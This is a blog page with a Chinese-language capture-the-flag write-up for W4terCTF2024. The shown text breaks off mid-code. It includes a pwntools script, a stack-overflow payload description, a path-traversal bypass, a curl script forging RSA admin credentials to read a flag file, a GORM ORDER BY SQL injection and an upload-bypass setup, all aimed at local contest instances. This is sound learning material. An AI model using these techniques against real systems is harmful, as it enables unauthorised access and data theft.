<!-- build time:Fri Jan 23 2026 20:11:06 GMT+0800 (中国标准时间) --><!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#FFF"><link rel="apple-touch-icon" sizes="180x180" href="/images/avatar.jpg"><link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico"><link rel="mask-icon" href="/images/avatar.jpg" color=""><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="google-site-verification" content="7QiG8wJPa5_9Ca0Y8hlhT0rJtNqEekDbao8u-zvq7zA"><meta name="msvalidate.01" content="9A952D9AAB23A5CE98B20FC76E335FA6"><meta name="yandex-verification" content="cb2a7fddf83f1d59"><link rel="alternate" type="application/rss+xml" title="taf.fyi" href="https://taf.fyi/rss.xml"><link rel="alternate" type="application/atom+xml" title="taf.fyi" href="https://taf.fyi/atom.xml"><link rel="alternate" type="application/json" title="taf.fyi" href="https://taf.fyi/feed.json"><link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7Cconsolas:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext"><link rel="stylesheet" href="/css/app.css?v=0.2.6"><meta name="keywords" content="ctf"><link rel="canonical" href="https://taf.fyi/cs/ctf/w4terctf2024/"><title>W4terCTF2024 WP - CTF - 计算机科学</title><script src="https://unpkg.com/typed.js@2.1.0/dist/typed.umd.js" async></script><meta name="generator" content="Hexo 7.3.0"></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">W4terCTF2024 WP</h1><div class="meta"><span class="item" title="Created: 2024-05-05 00:00:00"><span class="icon"><i class="ic i-calendar"></i> </span><span class="text">Posted on</span> <time itemprop="dateCreated datePublished" datetime="2024-05-05T00:00:00+08:00">2024-05-05</time> </span><span class="item" title="Symbols count in article"><span class="icon"><i class="ic i-pen"></i> </span><span class="text">Symbols count in article</span> <span>46k</span> <span class="text">words</span> </span><span class="item" title="Reading time"><span class="icon"><i class="ic i-clock"></i> </span><span class="text">Reading time</span> <span>42 mins.</span></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="Toggle navigation bar"><span class="line"></span> <span class="line"></span> <span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">taf.fyi</a></li></ul><ul class="right"><li class="item theme"><i class="ic i-sun"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div id="imgs" class="pjax"><img src="/assets/cs/ctf/w4terctf2024/cover.png"></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"/></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"/><use xlink:href="#gentle-wave" x="48" y="3"/><use xlink:href="#gentle-wave" x="48" y="5"/><use xlink:href="#gentle-wave" x="48" y="7"/></g></svg></div><main><div class="inner"><div id="main" class="pjax"><div class="article wrap"><div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i> <span><a href="/">Home</a></span><i class="ic i-angle-right"></i> <span itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/cs/" itemprop="item" rel="index" title="In 计算机科学"><span itemprop="name">计算机科学</span></a><meta itemprop="position" content="1"></span><i class="ic i-angle-right"></i> <span class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/cs/ctf/" itemprop="item" rel="index" title="In CTF"><span itemprop="name">CTF</span></a><meta itemprop="position" content="2"></span></div><article itemscope itemtype="http://schema.org/Article" class="post block" lang="en"><link itemprop="mainEntityOfPage" href="https://taf.fyi/cs/ctf/w4terctf2024/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/avatar.jpg"><meta itemprop="name" content="fuuzen"><meta itemprop="description" content="taf.fyi, fuuzen 的个人主页 taf.fyi"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="taf.fyi"></span><div class="body md" itemprop="articleBody"><p>年轻人的第一场 CTF ，学到了很多，比较走运拿了第五。最遗憾的是密码学板块了，认真学了不少抽象代数但还是没有做出几题。</p><p><img data-src="/assets/cs/ctf/w4terctf2024/rank.png" alt="rank"></p><p>队友们：（我起了个整活队名，其实是抄袭另一个叫做 “憧憬成为 CTFer” 的 ）</p><p><img data-src="/assets/cs/ctf/w4terctf2024/team.jpg" alt="team"></p><h1 id="ai"><a class="anchor" href="#ai">#</a> AI</h1><h2 id="network-reverse"><a class="anchor" href="#network-reverse">#</a> Network Reverse</h2><p>网络结构长这样：</p><pre><code>Sequential(
  (0): Conv2d(3, 4, kernel_size=(2, 2), stride=(1, 1))
  (1): GELU(approximate='none')
  (2): Conv2d(4, 8, kernel_size=(5, 5), stride=(1, 1))
  (3): GELU(approximate='none')
  (4): MaxPool2d(kernel_size=3, stride=3, padding=0, dilation=1, ceil_mode=False)
  (5): Linear(in_features=412, out_features=1848, bias=True)
  (6): Conv2d(8, 1, kernel_size=(1, 1), stride=(1, 1))
  (7): Tanh()
)
</code></pre><p>首先，卷积和池化层只会在图像中的一个较小的局部内用某种方式抹一把，并不会比如说把 W 的上半部分丢到另一个地方去，<strong>不会破坏可辨识的字体形状</strong>，所以卷积和池化层可以直接当做不存在。</p><p>第一层 <code>atan()</code> 没有难度，第三层给 <code>weight</code> 求个逆即可逆向：</p><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">def</span> <span class="token function">reverse</span><span class="token punctuation">(</span>ts<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    ts <span class="token operator">=</span> torch<span class="token punctuation">.</span>atanh<span class="token punctuation">(</span>ts<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    C <span class="token operator">=</span> ts</pre></td></tr><tr><td data-num="4"></td><td><pre>    A <span class="token operator">=</span> net<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">.</span>weight<span class="token punctuation">.</span>transpose<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    ts <span class="token operator">=</span> C @ torch<span class="token punctuation">.</span>pinverse<span class="token punctuation">(</span>A<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token keyword">return</span> ts</pre></td></tr></table></figure><p>上面这个函数逆向出来长这样：</p><p><img data-src="https://s2.loli.net/2024/04/29/mUBcnEN2zCRShaO.png" alt="network-reverse1"></p><p>感觉行之间的梯度非常小，不如来个竖直方向的锐化滤波器试试？</p><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>mat <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span>reverse<span class="token punctuation">(</span>tensor<span class="token punctuation">)</span><span class="token punctuation">.</span>detach<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>numpy<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre>kernel <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span> dtype<span class="token operator">=</span>np<span class="token punctuation">.</span>float32<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre>filtered <span class="token operator">=</span> cv2<span class="token punctuation">.</span>filter2D<span class="token punctuation">(</span>mat<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> kernel<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>plt<span class="token punctuation">.</span>imshow<span class="token punctuation">(</span>filtered<span class="token punctuation">,</span> cmap<span class="token operator">=</span><span class="token string">'gray'</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p><img data-src="https://s2.loli.net/2024/04/29/qiCOuyBTSU7KXw6.png" alt="network-reverse2"></p><p>啊？</p><h1 id="pwn"><a class="anchor" href="#pwn">#</a> Pwn</h1><h2 id="remember-it-0"><a class="anchor" href="#remember-it-0">#</a> Remember It 0</h2><p>签到题，自动化脚本获取 flag：</p><figure class="highlight python"><figcaption data-lang="python"><span>ipynb</span></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="2"></td><td><pre>p<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span> <span class="token number">50184</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Your choice: "</span><span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"1\n"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">": "</span><span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    x <span class="token operator">=</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\x08"</span><span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"plz input your answer\n"</span><span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    x <span class="token operator">=</span> x<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\n'</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"cat flag\n"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre>flag <span class="token operator">=</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"&#125;"</span><span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></pre></td></tr></table></figure><p><code>W4terCTF&#123;THOU9h_l_Hav3_tO_SAy_g0oD8y3~&#125;</code></p><h2 id="remember-it-1"><a class="anchor" href="#remember-it-1">#</a> Remember It 1</h2><p>无保护，可以栈溢出。</p><p><img data-src="https://s2.loli.net/2024/04/29/qcsDAJHgp5bZNeR.png" alt="Remember-It-1-1"></p><p><code>read</code> 一次读 32 字节，缓冲区有 10 * 32 字节，按理来说只有十轮游戏就不会越界，然而并没有超过十轮退出游戏的逻辑，十轮之后可以接着下一轮，这时读到的东西就越过缓冲区了。</p><p>比较菜，没用明白 <code>pwntools</code> ，是手搓十六进制编辑器作为输入，开着 gdb 一点一点试出来的。payload 如下：</p><p><img data-src="https://s2.loli.net/2024/04/29/nU18YoKDFALga5s.png" alt="Remember-It-1-2"></p><p>前面是一堆 <code>1\nAAAABBBB...\n</code> 用来跳过前十轮，第十一轮读指针已经位于栈顶附近，把 <code>FEE1DEAD</code> 的地址 <code>0xB61840</code> 放在 <code>$rbp</code> 指向的位置，然后用垃圾填满 32 字节结束本次 <code>read</code> ，下一轮选 4 退出游戏， <code>main</code> 返回，就会到达 <code>FEE1DEAD</code> 。</p><h2 id="2048"><a class="anchor" href="#2048">#</a> 2048</h2><p>ISTG 我真的只是随便敲了一坨输入进去，然后直接弹了句 <code>sh: 1: xxxxxx: not found</code> 给我整不会了。</p><p>下面是可以稳定 getshell 的 payload：</p><p><img data-src="https://s2.loli.net/2024/04/29/e5u37tTcN1jqFOy.png" alt="2048"></p><h1 id="web"><a class="anchor" href="#web">#</a> Web</h1><h2 id="gitzip"><a class="anchor" href="#gitzip">#</a> GitZip</h2><p>重新做了一遍：</p><p><img data-src="https://s2.loli.net/2024/04/29/cTfr4Qmi1jK5zeN.png" alt="gitzip1"></p><p>漏洞大概是这里：</p><p><img data-src="https://s2.loli.net/2024/04/29/j5ZdYeMpEIBiL2a.png" alt="gitzip2"></p><p>要把 <code>.</code> 和 <code>/</code> 都用 <code>%</code> 编码才能过， <code>/</code> 也要编码是我没想到的，大概是针对每一层 <code>/</code> 的处理会包含一些奇怪的特殊步骤，需要把 <code>/</code> 编码掉来跳过这些步骤，让完整的路径字符串直达 <code>req.params.htmlname</code> 。</p><h2 id="ashbp"><a class="anchor" href="#ashbp">#</a> ASHBP</h2><p>查看源代码，首先全局搜索 <code>flag</code> ，马上就找到可以直接得到 flag 的 <code>get_flag</code> 函数：</p><figure class="highlight php"><figcaption data-lang="PHP"><span>download.php</span></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">function</span> <span class="token function-definition function">get_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token keyword">return</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token function">rsa_decrypt</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token delimiter important">?></span></pre></td></tr></table></figure><p>同时在 <code>init.sh</code> 中可以看到 flag 的位置：</p><figure class="highlight bash"><figcaption data-lang="bash"><span>init.sh</span></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token shebang important">#!/bin/sh</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token builtin class-name">echo</span> <span class="token variable">$GZCTF_FLAG</span> <span class="token operator">></span> /tmp/flag</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token function">chmod</span> <span class="token number">444</span> /tmp/flag</pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token builtin class-name">unset</span> GZCTF_FLAG</pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre>base64 /var/www/html/src/rsa.pem <span class="token operator">></span> /var/www/html/src/rsa_base64.pem</pre></td></tr><tr><td data-num="9"></td><td><pre>base64 /var/www/html/src/rsa_pub.pem <span class="token operator">></span> /var/www/html/src/rsa_pub_base64.pem</pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre>php-fpm <span class="token parameter variable">-D</span></pre></td></tr><tr><td data-num="12"></td><td><pre>nginx <span class="token parameter variable">-g</span> <span class="token string">'daemon off;'</span></pre></td></tr></table></figure><p>flag 位置为 <code>/tmp/flag</code> ；</p><p>全局搜索 <code>get_flag</code> 找到调用该函数的地方：</p><figure class="highlight php"><figcaption data-lang="PHP"><span>admin.php</span></figcaption><table><tr><td data-num="1"></td><td><pre>......</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"rsa.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"download.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cre'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    </pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">rsa_decrypt</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cre'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"凭据无效！"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>        <span class="token keyword">echo</span> <span class="token function">get_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token delimiter important">?></span></pre></td></tr></table></figure><p>查看 <code>rsa_decrypt</code> 解密的逻辑：</p><figure class="highlight php"><figcaption data-lang="PHP"><span>rsa.php</span></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">function</span> <span class="token function-definition function">rsa_decrypt</span><span class="token punctuation">(</span><span class="token variable">$endata</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token comment">// 私钥解密</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token variable">$private_key</span> <span class="token operator">=</span> <span class="token function">openssl_pkey_get_private</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token constant">PRIVATE_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$private_key</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'私钥不可用'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token variable">$return_de</span> <span class="token operator">=</span> <span class="token function">openssl_private_decrypt</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$endata</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$decrypted</span><span class="token punctuation">,</span> <span class="token variable">$private_key</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$return_de</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>        <span class="token keyword">return</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'解密失败,请检查RSA秘钥'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token keyword">return</span> <span class="token variable">$decrypted</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>下载公钥 <code>rsa_pub.pem</code> ，RSA 加密后再 base64 加密 <code>admin</code> 和 <code>/tmp/flag</code> ，分别作为 <code>cre</code> 和 <code>flag</code> ， POST 获取 flag ：</p><figure class="highlight shell"><figcaption data-lang="Bash"><span>hack.sh</span></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token builtin class-name">export</span> <span class="token assign-left variable">cre</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">echo</span> admin <span class="token operator">|</span> openssl rsautl <span class="token parameter variable">-encrypt</span> <span class="token parameter variable">-inkey</span> rsa_pub.pem <span class="token parameter variable">-pubin</span> <span class="token operator">|</span> base64<span class="token variable">)</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token builtin class-name">export</span> <span class="token assign-left variable">flag</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">echo</span> flag <span class="token operator">|</span> openssl rsautl <span class="token parameter variable">-encrypt</span> <span class="token parameter variable">-inkey</span> rsa_pub.pem <span class="token parameter variable">-pubin</span> <span class="token operator">|</span> base64<span class="token variable">)</span></span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token function">curl</span> <span class="token parameter variable">-X</span> POST <span class="token parameter variable">-F</span> <span class="token string">"cre=<span class="token variable">$cre</span>"</span> <span class="token parameter variable">-F</span> <span class="token string">"flag=<span class="token variable">$flag</span>"</span> http://127.0.0.1:50741/admin.php</pre></td></tr></table></figure><p><code>W4terCTF&#123;Unl0ck_7he_sECreTs_O1_tHE_s1MPle_hOMEw0rk_SUbm1Ssion_PLATfoRM&#125;</code></p><h2 id="user-manager"><a class="anchor" href="#user-manager">#</a> User Manager</h2><figure class="highlight go"><figcaption data-lang="go"></figcaption><table><tr><td data-num="1"></td><td><pre>r<span class="token punctuation">.</span><span class="token function">GET</span><span class="token punctuation">(</span><span class="token string">"/users"</span><span class="token punctuation">,</span> <span class="token keyword">func</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>        <span class="token keyword">var</span> users <span class="token punctuation">[</span><span class="token punctuation">]</span>User</pre></td></tr><tr><td data-num="3"></td><td><pre>        orderBy <span class="token operator">:=</span> c<span class="token punctuation">.</span><span class="token function">Query</span><span class="token punctuation">(</span><span class="token string">"order_by"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre>        <span class="token keyword">if</span> orderBy <span class="token operator">==</span> <span class="token string">""</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>            orderBy <span class="token operator">=</span> <span class="token string">"id asc"</span></pre></td></tr><tr><td data-num="6"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>        db<span class="token punctuation">.</span><span class="token function">Order</span><span class="token punctuation">(</span>orderBy<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Find</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>users<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre>        <span class="token keyword">for</span> i <span class="token operator">:=</span> <span class="token keyword">range</span> users <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>            users<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>Secret <span class="token operator">=</span> <span class="token string">"hidden www~~"</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre>        c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span>StatusOK<span class="token punctuation">,</span> users<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>这里 <code>orderBy</code> 直接来自用户输入，而 GORM 文档写道：</p><p><img data-src="https://s2.loli.net/2024/04/29/RusG1mrbDpxjyTC.png" alt="user-manager"></p><p><span class="exturl" data-url="aHR0cHM6Ly9nb3JtLmlvL3poX0NOL2RvY3Mvc2VjdXJpdHkuaHRtbA==">安全 | GORM - The fantastic ORM library for Golang, aims to be developer friendly.</span></p><p>看起来 <code>db.Order(string)</code> 会把 <code>string</code> 直接拼在 SQL 语句的 <code>ORDER BY</code> 后面，于是加了个 <code>;</code> ，在后面注入了一句 <code>UPDATE</code> ，把所有用户的 <code>name</code> 改为自己的 <code>secret</code> ，下一次直接 GET 即可从用户的 <code>name</code> 字段拿到 flag。</p><h2 id="png-server"><a class="anchor" href="#png-server">#</a> PNG Server</h2><p><code>php.ini</code> 中存在漏洞：</p><figure class="highlight php"><figcaption data-lang="PHP"><span>php.ini</span></figcaption><table><tr><td data-num="1"></td><td><pre>cgi<span class="token operator">.</span>fix_pathinfo <span class="token operator">=</span> <span class="token number">1</span></pre></td></tr></table></figure><p>这个设置会导致所请求的 <code>.php</code> 文件不存在就会跳到上一层的路径查找文件，比如说 <code>http://....../.php</code> ，那么就可以确定我们需要上传一个 php 文件</p><p>源代码中用 <code>isImage</code> 来判断上传文件是否为图片，这里的检查非常随便，存在漏洞:</p><figure class="highlight php"><figcaption data-lang="PHP"><span>index.php</span></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">function</span> <span class="token function-definition function">isImage</span><span class="token punctuation">(</span><span class="token variable">$imgPath</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token variable">$file</span>  <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$imgPath</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token variable">$bin</span>  <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token variable">$strInfo</span> <span class="token operator">=</span> <span class="token function">unpack</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"C2chars"</span><span class="token punctuation">,</span> <span class="token variable">$bin</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token variable">$typeCode</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$strInfo</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'chars1'</span><span class="token punctuation">]</span> <span 